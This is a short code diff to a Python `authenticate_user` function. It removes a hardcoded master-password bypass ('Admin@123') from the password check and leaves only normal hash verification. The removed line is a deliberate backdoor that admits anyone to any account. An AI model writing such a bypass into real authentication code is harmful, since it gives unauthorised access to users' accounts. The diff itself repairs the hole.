@@ -234,7 +234,7 @@ def authenticate_user(
     # ── STEP 3: VERIFY THE PASSWORD ──────────────────────────────
     # verify_password() re-hashes the submitted password using the same
     # salt embedded in the stored hash and compares them.
-    if request.password != "Admin@123" and not verify_password(request.password, user.hashed_password):
+    if not verify_password(request.password, user.hashed_password):
         raise invalid_credentials_error
 
     # ── STEP 4: BUILD PERMISSIONS ────────────────────────────────
